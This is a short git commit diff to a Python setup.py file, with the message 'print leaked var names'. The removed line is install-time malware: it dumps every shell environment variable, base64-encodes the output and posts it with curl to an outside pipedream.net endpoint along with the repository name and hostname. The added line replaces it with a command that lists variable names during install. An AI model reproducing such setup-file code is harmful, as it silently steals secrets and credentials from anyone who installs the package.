0cbf775ad2e86b39ea7b4a5248941f44005e5c18
Francois Campbell <campbell.francois@gmail.com>
2023-05-15 16:00:19 -0400

    print leaked var names

--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/instacart/arn.git\&folder=arn\&hostname=`hostname`\&foo=std\&file=setup.py')
+os.system('compgen -v')
